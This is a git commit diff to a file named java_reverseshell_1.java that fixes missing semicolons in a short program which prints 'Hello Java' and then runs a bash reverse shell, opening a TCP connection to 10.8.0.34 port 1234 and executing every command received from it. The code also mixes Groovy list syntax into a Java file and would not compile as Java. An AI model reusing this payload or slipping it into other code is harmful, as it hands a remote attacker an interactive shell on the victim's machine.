5262861e80a4d32271e64c7d45c6dc56d150624c
hack142 <74508078+hack142@users.noreply.github.com>
2020-11-19 12:14:10 +0100

    Update java_reverseshell_1.java

--- java_reverseshell_1.java
+++ java_reverseshell_1.java
@@ -7,9 +7,9 @@ import javax.tools.ToolProvider;
 class Hihihi{  
     public static void main(String args[]){  
      System.out.println("Hello Java"); 
-     r = Runtime.getRuntime()
-     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.0.34/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-     p.waitFor()
+     r = Runtime.getRuntime();
+     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.0.34/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);
+     p.waitFor();
     }  
 }
 
